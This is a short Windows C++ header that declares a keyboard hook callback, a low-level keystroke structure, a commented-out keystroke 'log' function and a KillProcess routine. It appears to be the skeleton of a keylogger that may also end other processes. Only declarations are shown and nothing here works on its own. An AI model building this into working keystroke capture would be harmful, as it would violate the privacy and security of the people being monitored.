#include <afx.h>
#include<windows.h>
#include "tlhelp32.h"



int CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
//int log(char vkcode);


typedef struct {
	DWORD     vkCode;
	DWORD     scanCode;
	DWORD     flags;
	DWORD     time;
	ULONG_PTR dwExtraInfo;
} KBDLLHOOKSTRUCT2, *PKBDLLHOOKSTRUCT2;

void KillProcess(CString sExeName);